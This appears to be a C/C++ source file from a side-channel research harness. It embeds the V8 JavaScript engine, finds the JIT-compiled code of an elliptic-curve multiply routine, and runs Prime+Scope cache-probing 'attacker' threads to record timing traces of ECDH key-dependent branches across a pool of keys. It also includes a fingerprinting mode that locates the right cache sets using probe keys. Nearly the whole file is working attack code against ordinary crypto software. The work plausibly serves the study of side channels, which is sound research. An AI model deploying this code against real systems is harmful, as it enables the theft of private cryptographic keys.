#include <assert.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <cstdint>
#include <cstdlib>

#include "v8_runtime.h"

extern "C" {
#include "shared_memory.h"
#include "arch.h"
#include "config.h"
#include "log.h"
#include "fs.h"
#include "flush_reload.h"
#include "prime_probe.h"
}

static const char *test_name = "v8_ecdh_key_pool";
static char dump_dir[256];
uintptr_t jit_machine_code;
uint64_t ecdh_false_branch_offset = 0x1a6a, ecdh_true_branch_offset = 0x1b7a;
static const int max_exec_cycles = (int)1e8;
enum { cache_line_count = 3, profile_iterations = 1 << 16 };
static uint64_t probe_time_arr[cache_line_count][profile_iterations];
static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *probe_time[cache_line_count];
static uint64_t *reload_time[cache_line_count];
enum AttackPrimitive {
	FLUSH_RELOAD,
	PRIME_SCOPE,
};

const char *ec_key_pool_rpath = "experiments/v8_ecdh/ec_key_pool";
static enum AttackPrimitive attack_primitive = PRIME_SCOPE;

const int victim_runs = 100;
const int key_num = 100;

static pthread_barrier_t attacker_local_barrier;

static uint64_t cl_offset[3] = { 0x1b7a + CACHE_LINE_SIZE * 5,
	                             0x1a6a + CACHE_LINE_SIZE * 3,
	                             0x1b7a + CACHE_LINE_SIZE * 3 };
uintptr_t target_addr[3] = {};
static EVSet *evsets[3];
static int retry = 16;

static int use_csi = 0;

/* Probe keys ordered (a, b, c):
 *   a = csi_1.json   all-1s      → always true branch
 *   b = csi_0.json   all-0s      → always false branch
 *   c = csi_10.json  alternating → both branches equally */
static const char *csi_probe_keys[3] = {
	"experiments/v8_ecdh/ec_key_pool/ec_key_csi_1.json",
	"experiments/v8_ecdh/ec_key_pool/ec_key_csi_0.json",
	"experiments/v8_ecdh/ec_key_pool/ec_key_csi_10.json",
};

/* Expected fingerprint[ci][ki]: 1=single, 2=double, 0=no_hit
 *        key_a  key_b  key_c
 * cl0:    f1     f1     f1    (shared: accessed every iter regardless of bit)
 * cl1:    f3     f1     f2    (true branch:  every / never / every-other)
 * cl2:    f1     f3     f2    (false branch: never / every / every-other) */
static const int csi_fingerprint[cache_line_count][3] = {
	{ 1, 1, 1 }, /* cl0 common:            single, single, double->single */
	{ 0, 1, 2 }, /* cl1 = cl_offset[1] FALSE(0x1a6a): no_hit, single, double */
	{ 1, 0, 2 }, /* cl2 = cl_offset[2] TRUE(0x1b7a):  single, no_hit, double */
};

static const uint64_t csi_single_gap = 104000; /* leapx02 measured */
static const uint64_t csi_double_gap = 208000; /* leapx02 measured (2x) */
static const double csi_gap_tol_ratio = .12; /* +-12% */
static const int csi_cnt_tol_lo = 60; /* widened: real counts vary */
static const int csi_cnt_tol_hi = 90;

static int
csi_check_gap(uint64_t *tsc, int cnt, uint64_t expected, int expected_cnt) {
	if (cnt < expected_cnt - csi_cnt_tol_lo ||
	    cnt > expected_cnt + csi_cnt_tol_hi) {
		return 0;
	}
	uint64_t lo = expected - expected * csi_gap_tol_ratio;
	uint64_t hi = expected + expected * csi_gap_tol_ratio;
	int match = 0;
	for (int i = 1; i < cnt; i++) {
		uint64_t gap = tsc[i] - tsc[i - 1];
		if (gap >= lo && gap <= hi) {
			match++;
		}
	}
	return match >= (cnt - 1) * 0.75;
}

static int csi_f_single_gap(uint64_t *tsc, int cnt) {
	static const int csi_single_cnt = 252;
	return csi_check_gap(tsc, cnt, csi_single_gap, csi_single_cnt);
}
static int csi_f_double_gap(uint64_t *tsc, int cnt) {
	static const int csi_double_cnt = 126;
	return csi_check_gap(tsc, cnt, csi_double_gap, csi_double_cnt);
}

static int csi_f_no_hits(uint64_t *tsc, int cnt) {
	static const int csi_no_hit_thresh = 50;
	return cnt < csi_no_hit_thresh;
}

static const char *csi_cl_label(int cl) {
	switch (cl) {
	case 0:
		return "common";
	case 1:
		return "ones";
	case 2:
		return "zeros";
	default:
		return "?";
	}
}

static const char *csi_f_label(int f) {
	switch (f) {
	case 1:
		return "single";
	case 2:
		return "double";
	case 0:
		return "no_hit";
	case -1:
		return "NA";
	default:
		return "?";
	}
}

void *v8_attacker_thread(void *param) {
	// EVSet* evset = *(EVSet**)param;
	int32_t slot = *(int32_t *)param;
	log_info("attacker thread %d prepare", slot);
	log_info("attacker check value %p", jit_machine_code);

	helper_thread_ctrl hctrl;
	if (start_helper_thread(&hctrl)) {
		_error("Failed to start helper!\n");
		return 0;
	}

	log_info("attacker build evset");
	EVSet *evset = evsets[slot];

	log_info("attacker thread %d target address %p", slot, target_addr[slot]);

	uint8_t *scope = evset->addrs[0];
	evchain *sf_chain = evchain_build(evset->addrs, SF_ASSOC);
	i64 threshold = detected_cache_lats.l2_thresh;

	u64 tsc0, tsc1, end, scope_lat;
	u32 aux, index = 0;

	pthread_barrier_wait(sync_ctx.barrier);
	log_info("attacker thread start");

	for (int i = 0; i < key_num; ++i) {
		for (int j = 0; j < victim_runs; ++j) {
			prime_skx_sf_evset_ps_flush(
			    evset, sf_chain, array_repeat, l2_repeat);

			if (slot == 0) {
				memset(probe_time_arr, 0, sizeof(probe_time_arr));
				memset(sample_tsc_arr, 0, sizeof(sample_tsc_arr));
				pthread_barrier_wait(sync_ctx.barrier);
			}
			pthread_barrier_wait(&attacker_local_barrier);

			tsc0 = tsc1 = rdtscp();
			index = 0;
			do {
				tsc1 = rdtscp();

				scope_lat = _time_maccess_aux(scope, end, aux);
				int scope_evict = scope_lat > threshold &&
				                  scope_lat <
				                      detected_cache_lats.interrupt_thresh;
				if (scope_lat > threshold) {
					if (scope_lat < detected_cache_lats.interrupt_thresh) {
						probe_time[slot][index] = scope_lat;
						sample_tsc[slot][index] = tsc1;
						index++;
					}
					prime_skx_sf_evset_ps_flush(
					    evset, sf_chain, array_repeat, l2_repeat);
				}
			} while (tsc1 - tsc0 < max_exec_cycles &&
			         index < profile_iterations);

			log_info("Key %d slot %d find %d hits", i, slot, index);
			if (slot == 0) {
				snprintf(
				    dump_dir, sizeof(dump_dir), "%s_key%05d", test_name, i);
				dump_profiling_traces(dump_dir,
				                      victim_runs,
				                      sample_tsc,
				                      probe_time,
				                      cache_line_count,
				                      profile_iterations,
				                      j == 0);
			}
			pthread_barrier_wait(&attacker_local_barrier);
		}
	}
	stop_helper_thread(&hctrl);
	return NULL;
}

/* Barrier-synced single-derive profile: attacker profiles ONLY while the
 * victim is running one derive. Victim sets PAUSE when the derive finishes;
 * we stop then so the window == exactly one derive (no idle-tail noise). */

typedef struct {
	EVSet *ev;
	volatile int *stop;
} csi_noise_arg;

static void *csi_noise_thread(void *arg) {
	csi_noise_arg *na = (csi_noise_arg *)arg;
	EVSet *ev = na->ev;
	uint8_t *scope = ev->addrs[0];
	evchain *ch = evchain_build(ev->addrs, SF_ASSOC);
	u64 end;
	u32 aux;
	prime_skx_sf_evset_ps_flush(ev, ch, array_repeat, l2_repeat);
	while (!*na->stop) {
		u64 lat = _time_maccess_aux(scope, end, aux);
		if ((i64)lat > detected_cache_lats.l2_thresh) {
			prime_skx_sf_evset_ps_flush(ev, ch, array_repeat, l2_repeat);
		}
	}
	return NULL;
}

static uint32_t v8_csi_profile_once(EVSet *evset, uint64_t profile_iters,
                                    uint64_t max_cycles, uint64_t **sample_tsc,
                                    uint64_t **probe_time) {
	uint64_t tsc0, tsc1, end, scope_lat;
	uint32_t aux, index = 0;
	uint8_t *scope = evset->addrs[0];
	evchain *sf_chain = evchain_build(evset->addrs, SF_ASSOC);
	i64 threshold = detected_cache_lats.l2_thresh;

	prime_skx_sf_evset_ps_flush(evset, sf_chain, array_repeat, l2_repeat);
	tsc0 = tsc1 = rdtscp();
	sync_ctx_set_action(SYNC_CTX_START);
	pthread_barrier_wait(sync_ctx.barrier); /* A: release victim derive */
	do {
		tsc1 = rdtscp();
		scope_lat = _time_maccess_aux(scope, end, aux);
		if (scope_lat > threshold) {
			if (scope_lat < detected_cache_lats.interrupt_thresh) {
				probe_time[0][index] = scope_lat;
				sample_tsc[0][index] = tsc1;
				index++;
			}
			prime_skx_sf_evset_ps_flush(
			    evset, sf_chain, array_repeat, l2_repeat);
		}
	} while (tsc1 - tsc0 < max_cycles && index < profile_iters &&
	         sync_ctx_get_action() == SYNC_CTX_START);
	sync_ctx_set_action(SYNC_CTX_PAUSE);
	pthread_barrier_wait(sync_ctx.barrier); /* B: rendezvous with victim */
	return index;
}

static int v8_ecdh_csi(void) {
	config_t *cfg = get_config();

	/* victim wrote jit_machine_code into sync_ctx.data before barrier #1 */
	memcpy(&jit_machine_code, sync_ctx.data, sizeof(uintptr_t));
	log_info("CSI: jit_machine_code=%p", (void *)jit_machine_code);
	for (int ci = 0; ci < cache_line_count; ++ci) {
		target_addr[ci] = jit_machine_code + cl_offset[ci];
		log_info("CSI %s: addr=%p page_slot=%u",
		         csi_cl_label(ci),
		         (void *)target_addr[ci],
		         (unsigned)((target_addr[ci] & (PAGE_SIZE - 1)) >> CL_SHIFT));
	}

	/* LLCF — builds evsets for all L3 cache sets */

	helper_thread_ctrl hctrl;

	pthread_barrier_wait(sync_ctx.barrier); /* #2: victim enters eval loop */

	if (start_helper_thread(&hctrl)) {
		log_error("CSI: failed to start helper thread");
		sync_ctx_set_action(SYNC_CTX_EXIT);
		pthread_barrier_wait(sync_ctx.barrier); /* A */
		return 1;
	}

	for (int ki = 0; ki < cache_line_count; ++ki) {
		sample_tsc[ki] = sample_tsc_arr[ki];
		probe_time[ki] = probe_time_arr[ki];
	}

	uint32_t target_page_slot[cache_line_count];
	for (int ci = 0; ci < cache_line_count; ++ci) {
		target_page_slot[ci] =
		    (uint32_t)((target_addr[ci] & (PAGE_SIZE - 1)) >> CL_SHIFT);
	}

	/* recreate 3-thread system contention during the scan (test hypothesis) */
	volatile int csi_noise_stop = 0;
	pthread_t csi_nt[2] = { 0, 0 };
	csi_noise_arg csi_na[2];
	EVSet *nev0 = get_sf_kth_evset(64 + target_page_slot[0]);
	EVSet *nev1 = get_sf_kth_evset(128 + target_page_slot[0]);
	if (nev0 && nev1) {
		csi_na[0].ev = nev0; csi_na[0].stop = &csi_noise_stop;
		csi_na[1].ev = nev1; csi_na[1].stop = &csi_noise_stop;
		pthread_create(&csi_nt[0], NULL, csi_noise_thread, &csi_na[0]);
		pthread_create(&csi_nt[1], NULL, csi_noise_thread, &csi_na[1]);
		log_info("CSI: started 2 contention threads");
	}

	int found = 0;
	int csi_pass = 0;
	do {
		for (int l3_set = 0; l3_set < (int)cfg->l3.sets; ++l3_set) {
			uint32_t page_slot = (uint32_t)(l3_set % NUM_PAGE_SLOTS);

			int relevant = 0;
			for (int ci = 0; ci < cache_line_count; ++ci) {
				if (!evsets[ci] && page_slot == target_page_slot[ci]) {
					relevant = 1;
					break;
				}
			}
			if (!relevant) {
				continue;
			}

			EVSet *evset = get_sf_kth_evset(l3_set);
			if (!evset) {
				log_warn("CSI: no evset for l3_set=%d", l3_set);
				continue;
			}

			/* probe with keys a, b, c; classify each as f1/f2/f3 */
			int fcheck[cache_line_count] = {};
			int kcnt[cache_line_count] = {};
			for (int ki = 0; ki < cache_line_count; ++ki) {
				char key_path[512];
				snprintf(key_path,
				         sizeof(key_path),
				         "%s/%s",
				         cfg->project_root,
				         csi_probe_keys[ki]);
				snprintf(
				    (char *)sync_ctx.data, sync_ctx_data_size, "%s", key_path);
				sync_ctx_set_action(SYNC_CTX_SET_KEY);
				pthread_barrier_wait(sync_ctx.barrier); /* A */
				pthread_barrier_wait(sync_ctx.barrier); /* B */

				memset(sample_tsc_arr[ki],
				       0,
				       sizeof(uint64_t) * profile_iterations);
				memset(probe_time_arr[ki],
				       0,
				       sizeof(uint64_t) * profile_iterations);
				uint64_t *ki_tsc[1] = { sample_tsc_arr[ki] };
				uint64_t *ki_probe[1] = { probe_time_arr[ki] };
				v8_csi_profile_once(evset,
				                    profile_iterations,
				                    max_exec_cycles,
				                    ki_tsc,
				                    ki_probe);

				int cnt = 0;
				while (cnt < profile_iterations &&
				       sample_tsc_arr[ki][cnt] != 0) {
					++cnt;
				}
				kcnt[ki] = cnt;

				if (csi_f_single_gap(sample_tsc_arr[ki], cnt)) {
					fcheck[ki] = 1;
				} else if (csi_f_double_gap(sample_tsc_arr[ki], cnt)) {
					fcheck[ki] = 2;
				} else if (csi_f_no_hits(sample_tsc_arr[ki], cnt)) {
					fcheck[ki] = 0;
				} else {
					fcheck[ki] = -1;
				}
			}

			log_info("CSI l3_set=%d(%x) cnt=(%d,%d,%d) f=(%s,%s,%s)",
			         l3_set, l3_set, kcnt[0], kcnt[1], kcnt[2],
			         csi_f_label(fcheck[0]), csi_f_label(fcheck[1]),
			         csi_f_label(fcheck[2]));
			snprintf(dump_dir, sizeof(dump_dir), "%s_csi", test_name);
			dump_profiling_trace(dump_dir, l3_set, sample_tsc, probe_time,
			                     cache_line_count, profile_iterations);

			for (int ci = 0; ci < cache_line_count; ++ci) {
				if (evsets[ci] || page_slot != target_page_slot[ci]) {
					continue;
				}
				if (fcheck[0] == csi_fingerprint[ci][0] &&
				    fcheck[1] == csi_fingerprint[ci][1] &&
				    fcheck[2] == csi_fingerprint[ci][2]) {
					log_info(
					    LOG_BOLD_ON
					    "CSI: found %s evset l3_set=%d(%x) %p" LOG_BOLD_OFF,
					    csi_cl_label(ci),
					    l3_set,
					    l3_set,
					    evset);
					evsets[ci] = evset;
					found++;
				}
			}
		}
	} while (found != cache_line_count && ++csi_pass < 2);

	csi_noise_stop = 1;
	if (csi_nt[0]) pthread_join(csi_nt[0], NULL);
	if (csi_nt[1]) pthread_join(csi_nt[1], NULL);

	stop_helper_thread(&hctrl);

	if (found < cache_line_count) {
		log_error("CSI: only found %d/%d targets", found, cache_line_count);
		sync_ctx_set_action(SYNC_CTX_EXIT);
		pthread_barrier_wait(sync_ctx.barrier); /* A */
		return 1;
	}

	log_info("CSI: all %d targets found", cache_line_count);
	return 0;
}

int v8_ecdh_process_main(int argc, char *argv[]) {
	if (cache_env_init(1)) {
		log_error("Failed to initialize cache env!\n");

		return 0;
	}

	init_sync_ctx(V8_PROJ_ID);
	pthread_barrier_wait(sync_ctx.barrier); /* #1: wait for victim init done */

	jit_machine_code = ((uintptr_t *)sync_ctx.data)[0];

	log_info("Get jit code start %p", jit_machine_code);

	helper_thread_ctrl hctrl;

	if (LLCF_multi_evset(0, &hctrl)) {
		log_error("Failed to build evset");
		pthread_barrier_wait(sync_ctx.barrier);
		sync_ctx_set_action(SYNC_CTX_EXIT);
		pthread_barrier_wait(sync_ctx.barrier);
		return 1;
	}

	if (v8_ecdh_csi()) {
		return 1;
	}
	pthread_barrier_wait(sync_ctx.barrier);

	pthread_t thread_attacker = 0;
	uint32_t slot0 = 0, slot1 = 1, slot2 = 2;
	pthread_barrier_init(&attacker_local_barrier, NULL, cache_line_count);
	int err;

	err = pthread_create(&thread_attacker, NULL, v8_attacker_thread, &slot0);
	err = pthread_create(&thread_attacker, NULL, v8_attacker_thread, &slot1);
	err = pthread_create(&thread_attacker, NULL, v8_attacker_thread, &slot2);
	(void)err;

	for (int i = 0; i < key_num; ++i) {
		char key_path[512];
		snprintf(key_path,
		         sizeof(key_path),
		         "%s/%s/ec_key_%d.json",
		         get_config()->project_root,
		         ec_key_pool_rpath,
		         i);
		snprintf((char *)sync_ctx.data, sync_ctx_data_size, "%s", key_path);
		sync_ctx_set_action(SYNC_CTX_SET_KEY);
		pthread_barrier_wait(sync_ctx.barrier); /* A */
		pthread_barrier_wait(sync_ctx.barrier); /* B */

		for (int j = 0; j < 10; ++j) {
			sync_ctx_set_action(SYNC_CTX_START);
			pthread_barrier_wait(sync_ctx.barrier); /* A */
			pthread_barrier_wait(sync_ctx.barrier); /* B */
		}

		for (int j = 0; j < victim_runs; ++j) {
			sync_ctx_set_action(SYNC_CTX_START);
			pthread_barrier_wait(sync_ctx.barrier); /* A */
			pthread_barrier_wait(sync_ctx.barrier); /* B */
		}
	}

	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier); /* A */
	pthread_join(thread_attacker, NULL);
	return 0;
}

int v8_ecdh_thread_main(int argc, char *argv[]) {
	reset_sync_ctx(V8_PROJ_ID);

	v8::V8::SetFlagsFromCommandLine(&argc, argv, true);
	// Initialize V8.
	v8::V8::InitializeICUDefaultLocation(argv[0]);
	// v8::V8::InitializeExternalStartupData(argv[0]);
	std::unique_ptr<v8::Platform> platform = v8::platform::NewDefaultPlatform();
	v8::V8::InitializePlatform(platform.get());
	v8::V8::Initialize();

	// Create a new Isolate and make it the current one.
	v8::Isolate::CreateParams create_params;
	create_params.array_buffer_allocator =
	    v8::ArrayBuffer::Allocator::NewDefaultAllocator();
	v8::Isolate *isolate = v8::Isolate::New(create_params);
	{
		isolate->SetJitCodeEventHandler(
		    v8::kJitCodeEventDefault, [](const v8::JitCodeEvent *event) {
			    if (event->type != v8::JitCodeEvent::CODE_ADDED) {
				    return;
			    }
			    if (event->code_type != v8::JitCodeEvent::JIT_CODE) {
				    return;
			    }
			    if (event->script.IsEmpty()) {
				    return;
			    }
			    log_debug("JIT event %.*s: code_start=%p len=%zu",
			              event->name.len,
			              event->name.str,
			              event->code_start,
			              event->code_len);
			    const char target[] = "JS:*mul :6643:37";
			    if (event->name.len == sizeof(target) - 1 &&
			        memcmp(event->name.str, target, event->name.len) == 0) {
				    jit_machine_code =
				        reinterpret_cast<uintptr_t>(event->code_start);
				    log_info(LOG_BOLD_ON
				             "Get target address to %p" LOG_BOLD_OFF,
				             jit_machine_code);
			    }
		    });

		v8::Isolate::Scope iscope(isolate);

		// Create a stack-allocated handle scope.
		v8::HandleScope scope(isolate);

		// Create a new context.

		v8::TryCatch try_catch(isolate);

		v8::Local<v8::ObjectTemplate> global = v8::ObjectTemplate::New(isolate);
		global->Set(
		    isolate, "rdtscp", v8::FunctionTemplate::New(isolate, Rdtscp));
		global->Set(isolate, "read", v8::FunctionTemplate::New(isolate, Read));
		global->Set(isolate,
		            "readbuffer",
		            v8::FunctionTemplate::New(isolate, ReadBuffer));
		global->Set(
		    isolate, "print", v8::FunctionTemplate::New(isolate, Print));
		v8::Local<v8::Context> context =
		    v8::Context::New(isolate, nullptr, global);

		// Enter the context for compiling and running the hello world script.
		v8::Context::Scope cscope(context);

		{
			const char *source_str = read_file(argv[1]);
			const char *repeat_str = read_file(argv[2]);
			const char *set_keypair_template = read_file(argv[3]);

			log_trace("source: %s\n", source_str);
			log_trace("repeat: %s\n", repeat_str);

			log_info("V8 runtime load script");
			// Create a string containing the JavaScript source code.
			v8::Local<v8::String> source =
			    v8::String::NewFromUtf8(isolate, source_str).ToLocalChecked();

			// Compile the source code.
			v8::Local<v8::Script> script =
			    v8::Script::Compile(context, source).ToLocalChecked();

			// Run the script to get the result.
			v8::Local<v8::Value> result = script->Run(context).ToLocalChecked();

			{
				v8::Local<v8::String> repeat_src =
				    v8::String::NewFromUtf8(isolate, repeat_str)
				        .ToLocalChecked();

				v8::Local<v8::Script> repeat_script =
				    v8::Script::Compile(context, repeat_src).ToLocalChecked();

				v8::Local<v8::Value> repeat_script_result =
				    repeat_script->Run(context).ToLocalChecked();

				v8::Local<v8::Function> repeat_func =
				    repeat_script_result.As<v8::Function>();

				log_info("v8 runtime jit warmup");
				int jit_cnt = 1000;
				for (int i = 0; i < jit_cnt; ++i) {
					v8::MaybeLocal<v8::Value> maybe_result =
					    repeat_func
					        ->Call(context, context->Global(), 0, nullptr)
					        .ToLocalChecked();
					v8::Local<v8::Value> result;
					if (!maybe_result.ToLocal(&result)) {
						v8::String::Utf8Value error(isolate,
						                            try_catch.Exception());
						log_error("JIT warmup script error: %s\n",
						          *error ? *error : "unknown error");
					}
				}

				log_info("\n\n");

				if (cache_env_init(1)) {
					log_error("Failed to initialize cache env!\n");
					return 0;
				}

				helper_thread_ctrl hctrl;
				if (start_helper_thread(&hctrl)) {
					_error("Failed to start helper!\n");
					return 0;
				}

				for (int i = 0; i < cache_line_count; ++i) {
					target_addr[i] = jit_machine_code + cl_offset[i];
					log_info("cl%d : %p", i, target_addr[i]);
					evsets[i] = NULL;
					for (int r = 0; r < retry && evsets[i] == NULL; ++r) {
						evsets[i] = prepare_evset((u8 *)target_addr[i], &hctrl);
					}
					if (evsets[i] == NULL) {
						log_error("failed to build evset");
						exit(1);
					}
				}

				stop_helper_thread(&hctrl);
				// assert(*(uint64_t*)jit_machine_code == 0x48fffffff91d8d48);

				for (int i = 0; i < cache_line_count; ++i) {
					sample_tsc[i] = sample_tsc_arr[i];
					probe_time[i] = probe_time_arr[i];
				}

				pthread_t thread_attacker = 0;
				uint32_t slot0 = 0, slot1 = 1, slot2 = 2;
				pthread_barrier_init(
				    &attacker_local_barrier, NULL, cache_line_count);
				int err;
				err = pthread_create(
				    &thread_attacker, NULL, v8_attacker_thread, &slot0);
				err = pthread_create(
				    &thread_attacker, NULL, v8_attacker_thread, &slot1);
				err = pthread_create(
				    &thread_attacker, NULL, v8_attacker_thread, &slot2);

				log_info("V8 check value %p",
				         *(uint64_t *)(uintptr_t)jit_machine_code);
				log_info("V8 wait attacker");
				pthread_barrier_wait(sync_ctx.barrier);
				log_info("V8 start eval func");
				for (int i = 0; i < key_num; ++i) {
					char set_keypair_str[4096];
					char ec_key_pool_path[256];
					// FIXME
					// sprintf(ec_key_pool_path,
					//         "%s/%s",
					//         get_config()->project_root,
					//         ec_key_pool_rpath);
					sprintf(ec_key_pool_path,
					        "%s/%s",
					        get_config()->project_root,
					        csi_probe_keys[2]);
					sprintf(set_keypair_str,
					        set_keypair_template,
					        ec_key_pool_path,
					        i);

					log_debug("set key script: %s", set_keypair_str);
					v8::Local<v8::String> set_keypair_src =
					    v8::String::NewFromUtf8(isolate, set_keypair_str)
					        .ToLocalChecked();

					v8::Local<v8::Script> set_keypair_script =
					    v8::Script::Compile(context, set_keypair_src)
					        .ToLocalChecked();

					v8::MaybeLocal<v8::Value> maybe_result;
					maybe_result = set_keypair_script->Run(context);
					v8::Local<v8::Value> result;
					if (!maybe_result.ToLocal(&result)) {
						v8::String::Utf8Value error(isolate,
						                            try_catch.Exception());
						log_error("Set key pair script failed: %s\n",
						          *error ? *error : "unknown error");
						log_error("set_keypair_str:\n%s", set_keypair_str);
					}

					for (int j = 0; j < 10; ++j) {
						maybe_result = repeat_func->Call(
						    context, context->Global(), 0, nullptr);
						if (!maybe_result.ToLocal(&result)) {
							v8::String::Utf8Value error(isolate,
							                            try_catch.Exception());
							log_error("Repeat script failed: %s\n",
							          *error ? *error : "unknown error");
						}
					}

					for (int j = 0; j < victim_runs; ++j) {
						pthread_barrier_wait(sync_ctx.barrier);
						maybe_result = repeat_func->Call(
						    context, context->Global(), 0, nullptr);

						if (!maybe_result.ToLocal(&result)) {
							v8::String::Utf8Value error(isolate,
							                            try_catch.Exception());
							log_error("Repeat script failed: %s\n",
							          *error ? *error : "unknown error");
						}
					}
					sleep(1);
				}
				pthread_join(thread_attacker, NULL);
			}
		}
	}
	// Dispose the isolate and tear down V8.
	isolate->Dispose();
	v8::V8::Dispose();
	v8::V8::DisposePlatform();
	delete create_params.array_buffer_allocator;
	return 0;
}

int main(int argc, char *argv[]) {
	int new_argc = 0;
	for (int i = 0; i < argc; ++i) {
		if (strcmp(argv[i], "-csi") == 0) {
			use_csi = 1;
		} else {
			argv[new_argc++] = argv[i];
		}
	}
	argc = new_argc;

	if (use_csi) {
		return v8_ecdh_process_main(argc, argv);
	} else {
		if (argc == 1) {
			log_error("Eval file not provided");
			return 1;
		} else if (argc == 2) {
			log_error("Repeat file not provided");
			return 1;
		} else if (argc == 3) {
			log_error("keypair template not provided");
			return 1;
		} else {
			return v8_ecdh_thread_main(argc, argv);
		}
		return 0;
	}
}
